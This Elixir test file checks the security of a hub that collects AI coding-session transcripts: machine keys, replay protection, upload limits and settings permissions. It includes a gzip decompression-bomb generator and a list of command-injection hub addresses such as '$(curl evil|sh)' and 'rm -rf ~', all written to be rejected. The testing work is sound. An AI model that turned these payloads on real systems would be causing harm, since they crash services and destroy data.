defmodule Wallboard.MachineKeysTest do
  use ExUnit.Case, async: false

  alias Wallboard.Archive.{Ingest, MachineKeys}
  alias Wallboard.{Fixtures, Settings, Store, TestHub}
  alias WallboardWeb.SettingsLive

  @sid "9f8651f6-634b-47b7-a4db-b27994e624eb"

  defp tmp_dir do
    dir = Path.join(System.tmp_dir!(), "wallboard-keys-#{System.unique_integer([:positive])}")
    File.mkdir_p!(dir)
    on_exit(fn -> File.rm_rf!(dir) end)
    dir
  end

  # A hub with its archive on, in a throwaway folder.
  defp hub(dir) do
    old = Settings.get()
    on_exit(fn -> :persistent_term.put({Wallboard.Settings, :settings}, old) end)
    start_supervised!({Store, path: ":memory:"})
    url = TestHub.serve()
    # The address the scripts it serves name, as a real hub's settings give it.
    Settings.put(%{archive: %{enabled: true, path: Path.join(dir, "wallboard.db"), hub_url: url}})
    url
  end

  # A .tar.gz that unpacks to about `mb` megabytes of zeros, made small: one
  # megabyte compressed with a full flush comes out the same every time,
  # so it can be repeated. The end of the stream is left off, as unpacking
  # never gets that far.
  defp bomb(mb) do
    z = :zlib.open()
    :ok = :zlib.deflateInit(z, :best_compression, :deflated, 31, 8, :default)
    zeros = :binary.copy(<<0>>, 1_000_000)
    first = IO.iodata_to_binary(:zlib.deflate(z, zeros, :full))
    again = IO.iodata_to_binary(:zlib.deflate(z, zeros, :full))
    :zlib.close(z)
    first <> :binary.copy(again, mb - 1)
  end

  describe "the size limit" do
    test "an upload that would unpack past the limit is refused as it passes it" do
      # About 20 GB unpacked, from about 20 MB: unpacking it all would take
      # more memory than the machine running this test has.
      big = bomb(20_000)
      assert byte_size(big) < 25_000_000
      assert MachineKeys.window() == 300

      {micros, result} = :timer.tc(fn -> Ingest.unpack(big) end)
      assert result == {:error, :too_big}
      # It stopped at the limit, 512 MB in, not 20 GB.
      assert Ingest.max_unpacked() == 512_000_000
      assert micros < 30_000_000
    end

    test "an archive within the limit unpacks, and a cut-short one is refused" do
      files = [{~c"#{@sid}.jsonl", "{}\n"}]
      path = Path.join(tmp_dir(), "up.tgz")
      :ok = :erl_tar.create(String.to_charlist(path), files, [:compressed])
      tgz = File.read!(path)

      assert {:ok, [{name, "{}\n"}]} = Ingest.unpack(tgz)
      assert name == "#{@sid}.jsonl"

      assert Ingest.unpack(binary_part(tgz, 0, div(byte_size(tgz), 2))) ==
               {:error, "not a .tar.gz"}

      assert Ingest.unpack("not gzip at all") == {:error, "not a .tar.gz"}
    end

    test "the hub answers an upload past the limit with 413 and saves nothing" do
      dir = tmp_dir()
      url = hub(dir)
      Application.put_env(:wallboard, :max_unpacked, 5_000_000)
      on_exit(fn -> Application.delete_env(:wallboard, :max_unpacked) end)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "laptop"), "laptop")

      assert Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", bomb(50), id, key) ==
               {"413", "the upload unpacks to more than the hub takes"}

      refute File.exists?(Path.join([dir, "inbox", "laptop"]))
    end
  end

  describe "connecting a machine" do
    setup do
      dir = tmp_dir()
      url = hub(dir)
      claude = Path.join(dir, ".claude")
      codex = Path.join(dir, ".codex")
      File.mkdir_p!(codex)
      install = Path.join(dir, "install.sh")
      File.write!(install, Ingest.install_script(url))
      bin = Path.join(dir, "bin")
      File.mkdir_p!(bin)
      %{dir: dir, url: url, claude: claude, codex: codex, install: install, bin: bin}
    end

    # Runs a script with throwaway home, Claude and Codex folders, never the
    # real ones, and a PATH of the system's own tools after dir/bin.
    defp sh(ctx, args, env, input \\ nil) do
      args = if input, do: ["-c", ~s(sh "$0" < "$1"), hd(args), input], else: args

      System.cmd("sh", args,
        env:
          [
            {"HOME", ctx.dir},
            {"TMPDIR", ctx.dir},
            {"CLAUDE_CONFIG_DIR", ctx.claude},
            {"CODEX_HOME", ctx.codex},
            {"PATH", Enum.join([ctx.bin, "/usr/bin", "/bin", "/usr/sbin", "/sbin"], ":")}
          ] ++ env,
        stderr_to_stdout: true
      )
    end

    defp connect(ctx, key \\ nil),
      do: sh(ctx, [ctx.install], [{"WALLBOARD_KEY", key || MachineKeys.connect_key()}])

    # A Claude session ending, as its Stop hook tells the upload script.
    defp stop_hook(ctx) do
      project = Path.join([ctx.claude, "projects", "app"])
      File.mkdir_p!(project)
      transcript = Path.join(project, "#{@sid}.jsonl")

      File.write!(
        transcript,
        Jason.encode!(%{
          type: "user",
          sessionId: @sid,
          timestamp: "2026-09-30T13:00:00Z",
          message: %{role: "user", content: "hello"}
        }) <> "\n"
      )

      input = Path.join(ctx.dir, "stop.json")

      File.write!(
        input,
        Jason.encode!(%{
          session_id: @sid,
          transcript_path: transcript,
          hook_event_name: "SessionEnd"
        })
      )

      sh(ctx, [Path.join(ctx.claude, "wallboard-upload.sh")], [], input)
    end

    defp saved_machines,
      do: Store.query("SELECT machine FROM sessions", []) |> Enum.map(& &1.machine)

    test "gives the machine a key of its own that never crosses the network, and it sends", ctx do
      assert {out, 0} = connect(ctx)
      assert [_, machine] = Regex.run(~r/Connected as (\S+)\./, out)
      assert [%{machine: ^machine, key_id: id, last_used_at: nil}] = MachineKeys.list()

      # The same key beside each upload script, readable only by this user,
      # and neither key written into a script.
      for folder <- [ctx.claude, ctx.codex] do
        file = Path.join(folder, "wallboard-key")

        assert File.read!(file) ==
                 "#{id}\n#{machine}\n#{MachineKeys.derive(MachineKeys.connect_key(), id)}\n"

        assert File.stat!(file).access == :read_write
        assert Bitwise.band(File.stat!(file).mode, 0o077) == 0
        script = File.read!(Path.join(folder, "wallboard-upload.sh"))
        refute script =~ MachineKeys.connect_key()
        refute script =~ MachineKeys.derive(MachineKeys.connect_key(), id)
      end

      assert {"", 0} = stop_hook(ctx)
      assert saved_machines() == [machine]
      assert [%{last_used_at: used}] = MachineKeys.list()
      assert is_integer(used)
    end

    test "connecting again replaces the machine's key rather than adding one", ctx do
      assert {_, 0} = connect(ctx)
      assert [%{key_id: first}] = MachineKeys.list()
      assert {_, 0} = connect(ctx)
      assert [%{key_id: second}] = MachineKeys.list()
      assert first != second
    end

    test "a wrong connect key changes nothing on the machine", ctx do
      assert {out, 1} = connect(ctx, "not-the-key")
      assert out =~ "did not connect this machine (401): wrong signature"
      assert MachineKeys.list() == []
      refute File.exists?(Path.join(ctx.claude, "wallboard-key"))
      refute File.exists?(Path.join(ctx.claude, "settings.json"))
    end

    test "with no key given and no terminal to ask at, nothing changes", ctx do
      assert {out, 1} = sh(ctx, [ctx.install], [])
      assert out =~ "No connect key"
      assert MachineKeys.list() == []
    end

    test "a key pasted with spaces around it still connects", ctx do
      assert {_, 0} = connect(ctx, "  #{MachineKeys.connect_key()} \n")
      assert [_] = MachineKeys.list()
    end

    test "the command from the settings page runs the script only when it is the hub's", ctx do
      sha = :crypto.hash(:sha256, Ingest.install_script(ctx.url)) |> Base.encode16(case: :lower)
      key = [{"WALLBOARD_KEY", MachineKeys.connect_key()}]

      assert {out, _} =
               sh(
                 ctx,
                 ["-c", SettingsLive.install_command(ctx.url, String.duplicate("0", 64))],
                 key
               )

      assert out =~ "That is not the hub's connect script."
      assert MachineKeys.list() == []

      assert {out, 0} = sh(ctx, ["-c", SettingsLive.install_command(ctx.url, sha)], key)
      assert out =~ "Connected as"
      assert [_] = MachineKeys.list()
    end

    test "each script comes signed with the connect key, for the Mac app to check", ctx do
      for name <- ~w(upload.sh codex-upload.sh install.sh) do
        {out, 0} = System.cmd("curl", ["-s", "-D", "-", "#{ctx.url}/ingest/#{name}"])
        [head, body] = String.split(out, "\r\n\r\n", parts: 2)
        [_, sig] = Regex.run(~r/x-vitalaize-script-signature: ([0-9a-f]{64})/i, head)
        # Its name is signed too, so one script cannot be sent for another.
        assert sig ==
                 MachineKeys.hmac(
                   MachineKeys.connect_key(),
                   "vitalaize script\n#{name}\n" <> body
                 )
      end
    end

    test "without python3 or osascript it stops before the hub lists the machine", ctx do
      for tool <- ~w(dirname od tr cut mktemp cat head date printf rm mv chmod mkdir cp) do
        if path = System.find_executable(tool), do: File.ln_s!(path, Path.join(ctx.bin, tool))
      end

      for tool <- ~w(curl perl) do
        File.ln_s!(System.find_executable(tool), Path.join(ctx.bin, tool))
      end

      {out, 1} =
        System.cmd("sh", [ctx.install],
          env: [
            {"HOME", ctx.dir},
            {"CLAUDE_CONFIG_DIR", ctx.claude},
            {"CODEX_HOME", ctx.codex},
            {"WALLBOARD_KEY", MachineKeys.connect_key()},
            {"PATH", ctx.bin}
          ],
          stderr_to_stdout: true
        )

      assert out =~ "Needs python3"
      assert MachineKeys.list() == []
    end

    test "with no Digest::SHA for perl, python3 signs instead", ctx do
      # A perl that fails, as one without Digest::SHA would.
      File.write!(Path.join(ctx.bin, "perl"), "#!/bin/sh\nexit 2\n")
      File.chmod!(Path.join(ctx.bin, "perl"), 0o755)

      assert {out, 0} = connect(ctx)
      assert out =~ "Connected as"
      assert {"", 0} = stop_hook(ctx)
      assert length(saved_machines()) == 1
    end

    test "the connect key cannot send sessions, and a machine key cannot connect", ctx do
      {id, key} = Fixtures.connect_machine(Path.join(ctx.dir, "laptop"), "laptop")

      assert {"401", "sign with the connect key"} =
               Fixtures.signed_post(
                 ctx.url,
                 "/ingest/connect?machine=x&key=#{String.duplicate("c", 32)}",
                 "",
                 id,
                 key
               )

      assert {"401", "sign with this machine's key"} =
               Fixtures.signed_post(
                 ctx.url,
                 "/ingest/transcript?machine=laptop",
                 "",
                 "connect",
                 MachineKeys.connect_key()
               )
    end
  end

  describe "signed requests" do
    # A request as the hub sees it, signed at `time` with `key`.
    defp signed_conn(target, body, key_id, key, time) do
      [path, query] = String.split(target, "?")
      nonce = "0123456789abcdef"
      sig = MachineKeys.hmac(key, MachineKeys.message("POST", path, query, time, nonce, body))

      Plug.Test.conn(:post, target, body)
      |> Plug.Conn.put_req_header("x-vitalaize-key", key_id)
      |> Plug.Conn.put_req_header("x-vitalaize-time", time)
      |> Plug.Conn.put_req_header("x-vitalaize-nonce", nonce)
      |> Plug.Conn.put_req_header("x-vitalaize-signature", sig)
    end

    test "a copy of a request is refused, however slowly either comes, and an unsigned one writes nothing" do
      dir = tmp_dir()
      hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      t = System.os_time(:second)
      conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t))

      # Nothing is kept for a request until its signature checks out.
      assert {:ok, _} = MachineKeys.precheck(conn)
      assert {:ok, parts} = MachineKeys.precheck(conn)
      bad = %{parts | signature: String.duplicate("0", 64)}
      assert {:error, 401, "wrong signature"} = MachineKeys.verify(conn, bad, "{}")
      assert Store.query("SELECT * FROM seen_requests", []) == []

      # Then taken once; its copy is refused.
      assert MachineKeys.verify(conn, parts, "{}") == {:ok, "laptop"}

      assert {:error, 401, "this request was already sent once"} =
               MachineKeys.verify(conn, parts, "{}")

      # A nonce is kept past the window for as long as the slowest body may
      # take, so a copy that started inside the window and came slowly is
      # still refused; one signed before all that is refused as stale.
      keep = MachineKeys.keep_nonces()
      assert keep >= MachineKeys.window() + MachineKeys.upload_deadline()
      slow = t - MachineKeys.window() - MachineKeys.upload_deadline()
      assert Store.claim_nonce(id, "aaaa0000aaaa0000", slow, MachineKeys.window(), keep) == :ok
      assert Store.claim_nonce(id, "aaaa0000aaaa0000", slow, MachineKeys.window(), keep) == :seen

      assert Store.claim_nonce(id, "bbbb0000bbbb0000", t - keep - 5, MachineKeys.window(), keep) ==
               :stale

      assert Store.claim_nonce(id, "cccc0000cccc0000", t + 400, MachineKeys.window(), keep) ==
               :stale

      old = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t - 301))
      assert {:error, 401, "request time is more than 5 minutes" <> _} = MachineKeys.precheck(old)
    end

    test "a machine disconnected while its upload is on the way is refused" do
      dir = tmp_dir()
      hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      t = System.os_time(:second)
      conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t))

      assert {:ok, parts} = MachineKeys.precheck(conn)
      MachineKeys.revoke(id)

      assert MachineKeys.verify(conn, parts, "{}", t) ==
               {:error, 401, "this machine's key was taken away"}
    end

    test "a connect request with a form body is refused, so the form cannot change what was signed" do
      dir = tmp_dir()
      url = hub(dir)
      {victim, _} = Fixtures.connect_machine(Path.join(dir, "v"), "victim")
      target = "/ingest/connect?machine=alpha&key=#{String.duplicate("b", 32)}"
      t = to_string(System.os_time(:second))
      nonce = "0123456789abcdef"

      sig =
        MachineKeys.hmac(
          MachineKeys.connect_key(),
          MachineKeys.message(
            "POST",
            "/ingest/connect",
            String.split(target, "?") |> List.last(),
            t,
            nonce,
            ""
          )
        )

      {out, 0} =
        System.cmd("curl", [
          "-s",
          "-w",
          "\\n%{http_code}",
          "-H",
          "Content-Type: application/x-www-form-urlencoded",
          "-H",
          "X-Vitalaize-Key: connect",
          "-H",
          "X-Vitalaize-Time: #{t}",
          "-H",
          "X-Vitalaize-Nonce: #{nonce}",
          "-H",
          "X-Vitalaize-Signature: #{sig}",
          "--data-binary",
          "machine=victim&replaces=#{victim}",
          url <> target
        ])

      assert out == "send the body as data, not as a form\n\n400"
      assert [%{key_id: ^victim, machine: "victim"}] = MachineKeys.list()
    end

    test "an upload with a wrong signature is never read into memory, and leaves no file" do
      dir = tmp_dir()
      url = hub(dir)
      {id, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      tmp = System.tmp_dir!()
      before = tmp |> File.ls!() |> Enum.filter(&String.starts_with?(&1, "wallboard-upload-"))

      assert {"401", "wrong signature"} =
               Fixtures.signed_post(
                 url,
                 "/ingest/transcript?machine=laptop",
                 :binary.copy("x", 3_000_000),
                 id,
                 String.duplicate("0", 64)
               )

      after_ = tmp |> File.ls!() |> Enum.filter(&String.starts_with?(&1, "wallboard-upload-"))
      assert after_ -- before == []
    end

    test "a connect request with a body is refused" do
      dir = tmp_dir()
      url = hub(dir)

      assert {"413", "a connect request has no body"} =
               Fixtures.signed_post(
                 url,
                 "/ingest/connect?machine=x&key=#{String.duplicate("c", 32)}",
                 "some body",
                 "connect",
                 MachineKeys.connect_key()
               )
    end
  end

  describe "upload limits" do
    alias Wallboard.Archive.UploadGate

    test "unchecked uploads are capped per key and in all, and let go when their process ends" do
      start_supervised!(UploadGate)
      parent = self()

      # Holds a place from its own process until told to stop.
      hold = fn key, bytes ->
        spawn(fn ->
          send(parent, {:admitted, self(), UploadGate.admit(key, bytes)})

          receive do
            :stop -> :ok
          end
        end)
      end

      admitted = fn pid ->
        receive do
          {:admitted, ^pid, result} -> result
        end
      end

      a1 = hold.("k1", 100)
      assert admitted.(a1) == :ok
      a2 = hold.("k1", 100)
      assert admitted.(a2) == :ok
      # A third from the same key waits for the next turn.
      a3 = hold.("k1", 100)
      assert {:error, "this machine is already sending" <> _} = admitted.(a3)

      # Past 2 GB in all, from any key.
      big = hold.("k2", 1_999_999_900)
      assert {:error, "the hub is busy" <> _} = admitted.(big)

      # A holder that dies gives its place back.
      Process.exit(a1, :kill)
      Process.sleep(50)
      a4 = hold.("k1", 100)
      assert admitted.(a4) == :ok
      big = hold.("k2", 1_000_000_000)
      assert admitted.(big) == :ok
    end

    test "only two checked uploads unpack at once; the next waits its turn" do
      start_supervised!(UploadGate)
      parent = self()

      unpack = fn name ->
        spawn(fn ->
          UploadGate.unpack(fn ->
            send(parent, {:started, name})

            receive do
              :done -> :ok
            end
          end)
        end)
      end

      pids = %{a: unpack.(:a), b: unpack.(:b), c: unpack.(:c)}

      # Two start, in whatever order they asked; the third waits.
      started =
        for _ <- 1..2 do
          assert_receive {:started, name}
          name
        end

      refute_receive {:started, _}, 200

      send(pids[hd(started)], :done)
      [waiting] = Map.keys(pids) -- started
      assert_receive {:started, ^waiting}
    end

    test "an upload is kept in a folder only this user can open, and is gone once saved" do
      dir = tmp_dir()
      url = hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")

      assert {"422", "not a .tar.gz"} =
               Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", "x", id, key)

      incoming = Path.join(dir, "incoming")
      assert Bitwise.band(File.stat!(incoming).mode, 0o777) == 0o700
      assert File.ls!(incoming) == []
    end

    test "an upload that does not say its length is refused before it is read" do
      dir = tmp_dir()
      url = hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      t = to_string(System.os_time(:second))
      nonce = "0123456789abcdef"

      sig =
        MachineKeys.hmac(
          key,
          MachineKeys.message("POST", "/ingest/transcript", "machine=laptop", t, nonce, "x")
        )

      {out, 0} =
        System.cmd("curl", [
          "-s",
          "-w",
          "\n%{http_code}",
          "-H",
          "Transfer-Encoding: chunked",
          "-H",
          "Content-Type: application/gzip",
          "-H",
          "X-Vitalaize-Key: #{id}",
          "-H",
          "X-Vitalaize-Time: #{t}",
          "-H",
          "X-Vitalaize-Nonce: #{nonce}",
          "-H",
          "X-Vitalaize-Signature: #{sig}",
          "--data-binary",
          "x",
          url <> "/ingest/transcript?machine=laptop"
        ])

      assert out == "say how long the upload is\n\n411"
    end
  end

  describe "the settings page" do
    defp page(local? \\ true, keys? \\ true) do
      socket = %Phoenix.LiveView.Socket{
        assigns: %{
          __changed__: %{},
          allowed?: true,
          local?: local?,
          keys?: local? and keys?,
          connected?: true,
          errors: %{},
          notice: nil,
          restart?: false,
          show_key?: false,
          confirm_new_key?: false,
          confirm_disconnect: nil,
          flash: %{}
        }
      }

      # What mounting does for a live connection from this Mac.
      SettingsLive.load(socket)
    end

    defp html(socket),
      do:
        socket.assigns
        |> SettingsLive.render()
        |> Phoenix.HTML.Safe.to_iodata()
        |> IO.iodata_to_binary()

    test "disconnecting one machine leaves the others connected" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      {desk, _} = Fixtures.connect_machine(Path.join(dir, "b"), "desk")

      socket = page()
      assert html(socket) =~ "laptop"
      assert html(socket) =~ "desk"

      # The first tap only asks to be sure.
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert length(MachineKeys.list()) == 2
      assert html(socket) =~ "Tap again to disconnect"

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [%{key_id: ^desk, machine: "desk"}] = MachineKeys.list()
      assert socket.assigns.notice =~ "laptop is disconnected"
    end

    test "the connect command holds no key, and machines on the old key are listed" do
      dir = tmp_dir()
      hub(dir)
      Store.put_session(%{machine: "old-mac", session_id: @sid})
      MachineKeys.note_old_try("old-mac")
      # A name the board has never had sessions from is not listed.
      MachineKeys.note_old_try("made-up")
      page = html(page())

      assert page =~ "Machines to connect again"
      assert page =~ "old-mac"
      refute page =~ "made-up"
      refute page =~ MachineKeys.connect_key()
      refute SettingsLive.install_command("http://hub:4747", "abc") =~ MachineKeys.connect_key()
    end

    test "a new connect key disconnects every machine, since its old one may have been seen" do
      dir = tmp_dir()
      hub(dir)
      Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      Fixtures.connect_machine(Path.join(dir, "b"), "desk")
      old = MachineKeys.connect_key()

      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, page())
      assert length(MachineKeys.list()) == 2
      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, socket)

      assert MachineKeys.list() == []
      assert MachineKeys.connect_key() != old
      assert socket.assigns.notice =~ "every machine disconnected"
    end

    test "the hub address takes only a plain address, and only this Mac may change it" do
      dir = tmp_dir()
      hub(dir)

      for bad <- [
            "http://h:4747/$(curl evil|sh)",
            ~s(http://h:4747"; rm -rf ~; "),
            "http://h:4747\nexit",
            "http://h:4747/x?y=1",
            "http://h:4747/it's",
            "ftp://h"
          ] do
        refute Settings.hub_url?(bad), bad
      end

      for good <- [
            "http://192.168.1.20:4747",
            "https://hub.local",
            "http://[fe80::1]:4747/",
            "https://box.local/wallboard"
          ] do
        assert Settings.hub_url?(good), good
      end

      socket = page(false)
      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      # What the page saves, kept in the database.
      saved = fn -> Store.get_meta("settings_overrides") || "" end
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      refute saved.() =~ "10.0.0.9"

      socket = page(true)
      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      assert saved.() =~ "http://10.0.0.9:4747"
    end

    test "on this Mac too, the key and the address need the board's password" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      # This Mac, but no password: any account on it could be here.
      socket = page(true, false)

      for event <- ~w(toggle_key new_key) do
        assert {:noreply, ^socket} = SettingsLive.handle_event(event, %{}, socket)
      end

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [_] = MachineKeys.list()

      page = html(socket)
      assert page =~ "Give the board a password first"
      refute page =~ "/ingest/install.sh"
      refute page =~ MachineKeys.connect_key()
      refute page =~ ~s(phx-click="disconnect")

      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      refute (Store.get_meta("settings_overrides") || "") =~ "10.0.0.9"
    end

    test "another device, even with the board's password, cannot see the key or disconnect" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      socket = page(false)

      for event <- ~w(toggle_key new_key) do
        assert {:noreply, ^socket} = SettingsLive.handle_event(event, %{}, socket)
      end

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [_] = MachineKeys.list()

      page = html(socket)
      assert page =~ "Open this page on the Mac that runs the board"
      # Not even the command: coming over plain http, its check could have
      # been changed on the way.
      refute page =~ "/ingest/install.sh"
      refute page =~ ~s(phx-click="disconnect")
      refute page =~ MachineKeys.connect_key()
    end
  end
end
